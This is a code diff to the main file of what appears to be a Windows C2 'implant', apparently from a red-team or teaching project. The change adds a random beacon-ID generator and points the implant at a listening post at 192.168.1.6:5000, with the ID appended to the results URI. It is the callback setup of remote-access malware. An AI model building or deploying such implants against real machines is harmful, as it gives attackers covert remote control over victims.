@@ -7,18 +7,40 @@
 #pragma comment(lib, "CRYPT32.LIB") // We needed to include the following libs to compile our exe properly with static libs
 
 #include "implant.h"
+#include "glob_id.h" // Our global variable for Beacon ID
 #include <stdio.h>
 #include <windows.h>
 #include <tchar.h>
 #include <boost/system/system_error.hpp>
 
+extern std::string ids;
+
+void rando_string(char* sStr, unsigned int iLen) // Generates new random string
+{
+
+    char Syms[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    unsigned int Ind = 0;
+    srand(time(NULL) + rand());
+    while (Ind < iLen)
+    {
+        sStr[Ind++] = Syms[rand() % 62];
+    }
+    sStr[iLen] = '\0';
+
+}
+
 //int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
 int main()
 {
+    // Generates UUID for beacon
+    char beaconID[100];
+    rando_string(beaconID, 8);
+    ids = beaconID;
+
     // Specify address, port and URI of listening post endpoint
-    const auto host = "192.168.1.5";
+    const auto host = "192.168.1.6";
     const auto port = "5000";
-    const auto uri = "/results";
+    const auto uri = "/results/" + ids;
 
     // Instantiate our implant object
     Implant implant{ host, port, uri };
